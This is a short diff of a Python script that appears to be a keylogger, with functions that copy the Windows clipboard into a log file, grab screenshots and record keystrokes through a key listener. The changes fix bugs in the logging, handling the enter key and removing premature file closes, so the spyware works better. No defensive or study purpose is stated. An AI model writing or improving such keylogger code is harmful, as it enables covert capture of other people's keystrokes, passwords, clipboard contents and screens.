@@ -78,10 +78,10 @@ def copy_clipboard():
             pasted_data = win32clipboard.GetClipboardData()
             win32clipboard.CloseClipboard()
 
-            f.write("Clipboard Data: \n" + pasted_data)
+            f.write("\nClipboard Data: \n" + pasted_data)
 
         except:
-            f.write("Clipboard could be not be copied")
+            f.write("\nClipboard could be not be copied")
 
 def screenshot():
     im = ImageGrab.grab()
@@ -105,12 +105,12 @@ def write_file(keys):
     with open(keys_information, "a") as f:
         for key in keys:
             k = str(key).replace("'", "")
-            if k.find("space") > 0:
+            if k.find("enter") > 0:
+                f.write('\n')
+            elif k.find("space") > 0:
                 f.write(' ')
-                f.close()
             elif k.find("Key") == -1:
                 f.write(k)
-                f.close()
 listener = Listener(on_press=on_press)
 
 def start_logger():
